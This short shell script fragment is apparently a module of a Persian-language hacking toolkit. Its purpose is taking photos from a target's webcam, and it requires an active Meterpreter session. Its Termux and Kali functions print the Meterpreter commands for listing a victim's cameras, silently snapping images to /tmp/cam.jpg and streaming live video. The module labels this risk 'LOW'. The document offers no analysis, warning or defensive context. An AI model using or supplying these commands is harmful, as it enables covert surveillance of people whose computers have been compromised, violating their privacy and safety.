DESC="عکس از وبکم هدف"
REQ="session فعال meterpreter"
RISK="LOW"

termux(){ echo "# داخل meterpreter: webcam_list && webcam_snap -i 1 -v false"; }

kali(){
cat <<'EOF'
# داخل meterpreter:
webcam_list
webcam_snap -i 1 -v false -p /tmp/cam.jpg
webcam_stream -i 1
EOF
}
